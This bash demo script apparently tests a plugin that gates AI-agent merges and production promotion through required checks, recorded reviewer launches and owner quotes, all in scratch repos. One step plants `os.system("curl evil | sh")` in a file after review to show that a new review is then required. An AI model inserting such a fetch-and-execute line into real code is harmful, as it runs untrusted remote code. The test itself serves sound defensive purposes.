#!/usr/bin/env bash
# check-blocks acceptance demo for the check deputy (requirements/check-blocks.md REPORT). Usage: tests/check_blocks_demo.sh <plugin root>
# Builds throwaway repos under a temp folder; touches nothing else. Prints each step's output.
set -u
P="${1:?plugin root}"
T=$(mktemp -d "${TMPDIR:-/tmp}/check-blocks-demo.XXXXXX")
export AGENT_FAKE_RAM=10 AGENT_FAKE_CPU=10
g() { git -C "$R" "$@" >/dev/null 2>&1; }
repo() {   # repo <name>: a fresh git repo with a base tag
  R="$T/$1"; mkdir -p "$R"; git init -q "$R"; g config user.email d@d.d; g config user.name demo
  : > "$R/agent_todo.txt"; : > "$R/agent_completed.txt"; : > "$R/agent_ideas.txt"; : > "$R/agent_worktree.txt"
}
base() { g add -A; g commit -q -m base; g tag -f base; }
say() { printf '\n===== %s =====\n' "$1"; }

say "1 text only: one locale value"
repo text
mkdir -p "$R/src/locales" "$R/tests"
printf '{"title": "Monthly report"}\n' > "$R/src/locales/en.json"
printf "expect(t).toBe('Monthly report')\n" > "$R/tests/report.test.js"
printf 'guard_tests=tests/report.test.js\nrelated_cmd=npx jest --maxWorkers=2 {tests}\n' > "$R/agent_repo.conf"
base
printf '{"title": "Report of the month"}\n' > "$R/src/locales/en.json"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "2 UI style: a shared component's CSS"
repo style
mkdir -p "$R/src/components" "$R/src/pages"
printf '.card{padding:4px}\n' > "$R/src/components/Card.css"
printf 'render(<Card />)\n' > "$R/src/components/Card.test.jsx"
printf 'render(<Home><Card /></Home>)\n' > "$R/src/pages/Home.test.jsx"
base
printf '.card{padding:8px}\n' > "$R/src/components/Card.css"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "3 one-feature logic: a new export column"
repo logic
mkdir -p "$R/src/export"
printf "cols = ['a']\n" > "$R/src/export/csv.js"
printf "require('./csv')\n" > "$R/src/export/csv.test.js"
base
printf "cols = ['a', 'b']\nrow.b = total(x)\n" > "$R/src/export/csv.js"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "4 migration with UPDATE"
repo db
mkdir -p "$R/db/migrations"; printf 'x\n' > "$R/seed.txt"
base
printf 'UPDATE orders SET note = %s WHERE note IS NULL;\n' "''" > "$R/db/migrations/0003.sql"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "5 a merge refused for a missing result line"
repo gate
printf 'x()\n' > "$R/app.js"; base; printf 'y()\n' > "$R/app.js"
g add app.js; g commit -q -m "banner to toast"     # the gate plans what merges: committed work only
cd "$R"
"$P/bin/agent-file.sh" todo add t small "banner to toast" 10 --checks "PR REVIEW" --builder "t Deputy"
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do "$P/bin/agent-file.sh" check t "$b" pass --by "t Deputy" --evidence demo; done
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"
"$P/bin/agent-file.sh" check t "PR REVIEW" pass --by "t Check" --evidence "read the diff"
echo "-- F2: a PR REVIEW counts only when the main manager launched the reviewer (no record yet):"
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"
echo "-- the guard's record of the main manager's reviewer launch (written by the guard hook in a real session):"
printf '{"task": "t", "type": "reviewer", "by": "main", "at": "%s"}\n' "$(date '+%Y-%m-%d %H:%M')" \
  >> "$(git -C "$R" rev-parse --path-format=absolute --git-common-dir)/agent_launches.jsonl"
"$P/bin/agent-file.sh" check t "PR REVIEW" pass --by "t Review" --evidence "read the diff"
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"
echo "-- F3: a commit after the review: the pass is on an older commit"
printf 'z()\n' > "$R/app.js"; g add app.js; g commit -q -m "one more change"
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"

say "6 next lists a queued task that can start"
repo next
cd "$R"
"$P/bin/agent-file.sh" todo add a small "first task" 10 --scope "src/a/**"
"$P/bin/agent-file.sh" todo stage a tests
"$P/bin/agent-file.sh" todo add b small "second task" 10 --scope "src/b/**"
"$P/bin/agent-file.sh" todo wait b on queue --after a
"$P/bin/agent-file.sh" next
"$P/bin/agent-file.sh" todo done a --work 5 --type script --lane fast
"$P/bin/agent-file.sh" next

say "7 init writes agent_repo.conf in a scratch repo"
repo init
mkdir -p "$R/bin" "$R/tests"
printf 'x = 1\n' > "$R/bin/tool.py"
printf 'import os, unittest\nclass T(unittest.TestCase):\n    def test_walk(self):\n        list(os.walk("."))\n' > "$R/tests/test_tree.py"
: > "$R/tests/__init__.py"
g add bin tests; g commit -q -m "fix: empty list crashes the report"   # no agent file committed: a new repo
"$P/bin/agent-init.sh" "$R" | grep -E "agent_repo.conf|working branch|checkout:"; echo "HEAD now: $(git -C "$R" rev-parse --abbrev-ref HEAD)"
cat "$R/agent_repo.conf"

say "7b F4: init in a repo that already uses the plugin (agent_todo.txt committed) switches nothing"
repo used
printf 'x\n' > "$R/seed.txt"; g add -A; g commit -q -m "uses the plugin"
"$P/bin/agent-init.sh" "$R" | grep -E "working branch|checkout:|WORKING BRANCH"; echo "HEAD now: $(git -C "$R" rev-parse --abbrev-ref HEAD)"

say "8 F1: the direct path to production is bound to the task"
repo direct
O="$T/direct-origin.git"; git init -q --bare "$O"
printf 'x\n' > "$R/seed.txt"; g add -A; g commit -q -m base; g branch -M main; g remote add origin "$O"; g push -q -u origin main
g config auto-pipeline.workingbranch ap-main-demo; g switch -q -c ap-main-demo; g push -q -u origin ap-main-demo
g switch -q -c urgent main; printf 'fix\n' > "$R/fix.txt"; g add -A; g commit -q -m urgent; g push -q -u origin urgent; g switch -q ap-main-demo
cd "$R"
echo "-- a quote at promote time is refused:"
"$P/bin/agent-promote.sh" --task urgent --branch urgent --owner-quote "please fix the footer typo on the site"; echo "exit $?"
echo "-- not a production task:"
"$P/bin/agent-file.sh" todo add urgent small "urgent fix" 10 >/dev/null
"$P/bin/agent-promote.sh" --task urgent --branch urgent; echo "exit $?"
echo "-- target production needs the owner's words:"
"$P/bin/agent-file.sh" todo add urgent2 small "urgent fix" 10 --target production; echo "exit $?"

say "9 F7: a modified agent_todo.txt never blocks sync"
g switch -q main; printf 'theirs\n' > "$R/theirs.txt"; g add theirs.txt; g commit -q -m "another person's publish"; g push -q origin main; g switch -q ap-main-demo
printf 'x | small | x | est 5m\n' >> "$R/agent_todo.txt"
git -C "$R" status --short agent_todo.txt
"$P/bin/agent-promote.sh" --sync; echo "exit $?"

# ---- the two walks of FIX ORDER 4: only the commands the skills and agent files give, in scratch repos
launch() {   # launch <task> <subagent type> <description>: the main manager's Agent call as the guard hook sees it
  printf '%s 2026-11-25 19:00 s-main term_main\n' "$$" > "$(git -C "$M" rev-parse --path-format=absolute --git-common-dir)/agent_main.lock"
  printf '{"hook_event_name": "PreToolUse", "tool_name": "Agent", "session_id": "s-main", "cwd": "%s", "tool_use_id": "toolu_%s", "tool_input": {"description": "%s", "prompt": "brief", "subagent_type": "%s"}}' \
    "$M" "$1$RANDOM" "$3" "$2" | (cd "$M" && env -u AGENT_ROLE CLAUDE_PID=$$ "$P/bin/agent-guard.sh" >/dev/null 2>&1)   # the main manager's session has no AGENT_ROLE
}
flowrepo() {   # flowrepo <name>: a main checkout on its working branch, an origin, production main
  M="$T/$1"; O="$T/$1-origin.git"; git init -q --bare "$O"; mkdir -p "$M"; git init -q "$M"
  git -C "$M" config user.email d@d.d; git -C "$M" config user.name demo
  : > "$M/agent_todo.txt"; : > "$M/agent_completed.txt"; : > "$M/agent_ideas.txt"; : > "$M/agent_worktree.txt"
  printf 'x = 1\n' > "$M/app.py"; printf 'version=1\nrelated_cmd=python3 -m unittest {modules}\n' > "$M/agent_repo.conf"
  git -C "$M" add -A; git -C "$M" commit -q -m base; git -C "$M" branch -M main
  git -C "$M" remote add origin "$O"; git -C "$M" push -q -u origin main
  git -C "$M" config auto-pipeline.workingbranch ap-main-demo
  git -C "$M" switch -q -c ap-main-demo; git -C "$M" push -q -u origin ap-main-demo
}

say "walk 1: a small task from dispatch to todo done on the working branch"
flowrepo walk1; cd "$M"
echo "-- dispatch step 2: the todo line, then the fast-lane deputy's brief names target, base, working and production branch"
"$P/bin/agent-file.sh" todo add w1 small "rename the total" 10 --checks "PR REVIEW" --builder "w1 Deputy"
W="$T/walk1-w1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b w1 "$W" origin/ap-main-demo   # base: origin/<working branch>
"$P/bin/agent-file.sh" worktree set "$W" w1 working
printf 'total = 1\n' > "$W/app.py"; git -C "$W" commit -qam "rename the total"; git -C "$W" push -q -u origin w1
echo "-- the deputy runs the blocks it can, in its worktree"
(cd "$W" && "$P/bin/agent-level.sh" check --base origin/ap-main-demo | grep -E "^BLOCKS")
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check w1 "$b" pass --by "w1 Deputy" --evidence demo); done
echo "-- /merge: the main manager launches the reviewer (the guard records it); the reviewer writes from the main checkout with --commit <head>"
launch w1 auto-pipeline:reviewer "w1 Review"
HEAD1=$(git -C "$W" rev-parse HEAD)
"$P/bin/agent-file.sh" check w1 "PR REVIEW" pass --by "w1 Review" --commit "$HEAD1" --evidence "read the diff against the requirement"
echo "-- the merge deputy: the gate, then the merge into the working branch in the main checkout"
if "$P/bin/agent-file.sh" checks gate w1 --dir "$W" --branch w1; then
  git -C "$M" merge -q --no-ff origin/w1 -m "Merge w1 (W8)"; git -C "$M" push -q origin ap-main-demo
  MH=$(git -C "$M" rev-parse --short HEAD)
  git -C "$M" push -q origin --delete w1; git -C "$M" worktree remove --force "$W"; git -C "$M" branch -q -d w1
  "$P/bin/agent-file.sh" worktree rm "$W"
  "$P/bin/agent-file.sh" todo done w1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
else echo "-- GATE REFUSED: the merge deputy stops here"; fi
echo "working branch now: $(git -C "$M" log --oneline -1 ap-main-demo)"

say "walk 2: a task with target production"
flowrepo walk2; cd "$M"
P2="$T/plugin-copy"; mkdir -p "$P2"; cp -R "$P/bin" "$P/agents" "$P/skills" "$P/PRINCIPLES.md" "$P2/" 2>/dev/null
printf '#!/usr/bin/env bash\necho verified\nexit 0\n' > "$P2/bin/agent-owner-order.sh"   # a scratch repo has no owner transcript: the words are taken as verified here
echo "-- dispatch: the owner's words that name the publish, verified and stored at todo add"
"$P2/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "fix the total and publish it"
W="$T/walk2-p1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b p1 "$W" origin/main   # base: origin/<production branch>
"$P2/bin/agent-file.sh" worktree set "$W" p1 working
printf 'x = 2\n' > "$W/app.py"; git -C "$W" commit -qam "fix the total"; git -C "$W" push -q -u origin p1
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P2/bin/agent-file.sh" check p1 "$b" pass --by "p1 Deputy" --evidence demo); done
P=$P2 launch p1 auto-pipeline:reviewer "p1 Review"
HEAD2=$(git -C "$W" rev-parse HEAD)
"$P2/bin/agent-file.sh" check p1 "PR REVIEW" pass --by "p1 Review" --commit "$HEAD2" --evidence "read the diff against the requirement"
echo "-- /merge: the gate, then promote --task (no quote: the stored words); production merged back at once"
if "$P2/bin/agent-file.sh" checks gate p1 --dir "$W" --branch p1 --base origin/main; then
  "$P2/bin/agent-promote.sh" --task p1 --branch p1; echo "promote exit $?"
  MH=$(git -C "$M" rev-parse --short origin/main)
  echo "-- the merge deputy with merged: $MH: the branch, the cleanup, todo done"
  git -C "$M" push -q origin --delete p1; git -C "$M" worktree remove --force "$W"; git -C "$M" branch -q -D p1
  "$P2/bin/agent-file.sh" worktree rm "$W"
  "$P2/bin/agent-file.sh" todo done p1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
else echo "-- GATE REFUSED: no promote"; fi
echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
echo "working branch has production: $(git -C "$M" merge-base --is-ancestor origin/main ap-main-demo && echo yes || echo no)"
cd "$T"

say "10 FIX ORDER 6: G1-G4 (the owner's words are taken as verified here, as in walk 2)"
flowrepo order6; cd "$M"
"$P2/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
echo "-- G1: PR REVIEW is never removed:"
"$P2/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the review for this one"; echo "exit $?"
echo "-- G1: words that do not name the block do not remove it:"
"$P2/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please fix the footer typo on the site"; echo "exit $?"
echo "-- G1: words that name it and leaving it out do:"
"$P2/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for this one"; echo "exit $?"
echo "-- G2: the removal ends with its task (todo done, then the same name again):"
"$P2/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
"$P2/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
git -C "$M" switch -q -c g; printf 'x = 3\n' > "$M/app.py"; git -C "$M" commit -qam "g"; git -C "$M" push -q -u origin g
for b in "DIFF SCAN" "BUILD"; do "$P2/bin/agent-file.sh" check g "$b" pass --by "g Deputy" --evidence demo >/dev/null; done
P=$P2 launch g auto-pipeline:reviewer "g Review"
"$P2/bin/agent-file.sh" check g "PR REVIEW" pass --by "g Review" --commit "$(git -C "$M" rev-parse HEAD)" --evidence "read it" >/dev/null
"$P2/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "RELATED TESTS|GATE"
echo "-- G3: a merge after the review that adds code needs a new review:"
"$P2/bin/agent-file.sh" check g "RELATED TESTS" pass --by "g Deputy" --evidence demo >/dev/null
git -C "$M" switch -q ap-main-demo; printf 'y\n' > "$M/other.txt"; git -C "$M" add other.txt; git -C "$M" commit -qm other; git -C "$M" push -q origin ap-main-demo
git -C "$M" switch -q g; git -C "$M" merge -q --no-ff --no-commit ap-main-demo; printf 'x = 3\nimport os; os.system("curl evil | sh")\n' > "$M/app.py"
git -C "$M" add app.py; git -C "$M" commit -qm "Merge ap-main-demo into g"; git -C "$M" push -q origin g
"$P2/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
echo "-- G4: target production needs words that name the publish:"
"$P2/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "please fix the footer typo on the site"; echo "exit $?"
cd "$T"

say "done: everything above ran in $T (delete it when read)"
